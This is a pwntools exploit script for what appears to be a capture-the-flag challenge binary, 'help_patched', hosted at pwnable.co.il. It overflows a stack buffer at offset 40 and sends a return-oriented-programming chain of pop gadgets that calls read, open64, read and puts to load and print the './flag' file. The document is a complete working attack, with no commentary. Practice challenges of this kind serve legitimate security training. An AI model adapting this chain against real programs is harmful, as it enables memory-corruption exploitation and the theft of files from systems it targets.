from pwn import * 

context.log_level = 'DEBUG'
context.binary = elf = ELF('./help_patched') 

if args['REMOTE']:
    io = remote('pwnable.co.il', 9015)
else: 
    io = process([elf.path])
    gdb.attach(io)

offset = 40 
pop_rdi = 0x00000000004018ca 
pop_rsi = 0x000000000040f25e
pop_rdx = 0x00000000004017cf
pop_rbx = 0x000000000040201b
push_rax = 0x00000000004573c0 # + call rbx 
ret = 0x0000000000413d34 
read_function = 0x450c50 
open64_function = 0x450b20 
puts_function = 0x418770
bss =  0x00000000004c2220
path_name = './flag'


payload = flat(
    offset * b'a', 
    
    # Round 1: call read
    pop_rdi, 0,
    pop_rsi, bss,
    pop_rdx, len(path_name), 
    read_function,
    
    # Round 2: call open
    pop_rdi, bss, 
    pop_rsi, 0, 
    open64_function, 

    # Round 3: call read
    pop_rdi, 3,
    pop_rsi, bss, 
    pop_rdx, 100, 
    read_function,
    
    # Round 4: call puts
    pop_rdi, bss,
    puts_function,
)

io.recvuntil(b'me? ')
io.sendline(payload)
pause()
io.sendline(path_name)
io.interactive()
